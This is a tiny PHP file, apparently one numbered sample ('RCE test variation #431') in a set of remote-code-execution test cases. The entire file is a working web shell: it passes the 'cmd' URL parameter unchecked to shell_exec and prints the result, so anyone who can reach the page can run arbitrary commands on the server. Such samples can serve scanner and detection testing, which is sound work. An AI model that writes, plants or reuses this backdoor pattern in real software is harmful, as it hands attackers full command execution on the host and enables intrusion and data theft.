<?php
// RCE test variation #431
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>